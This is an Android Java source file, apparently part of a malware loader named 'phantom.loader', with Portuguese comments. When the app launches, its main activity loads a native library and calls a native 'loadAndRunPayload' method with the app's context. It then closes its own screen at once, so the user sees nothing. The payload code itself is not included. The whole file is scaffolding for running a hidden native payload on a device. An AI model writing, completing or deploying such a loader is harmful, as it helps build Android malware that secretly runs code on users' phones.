package com.phantom.loader;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    
    // Carrega a biblioteca nativa
    static {
        System.loadLibrary("native-loader");
    }

    // Declara a função que está no C++
    public native void loadAndRunPayload(Object context);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Chama a execução nativa passando o contexto
        loadAndRunPayload(this);
        
        // Fecha a tela imediatamente
        finish();
    }
}
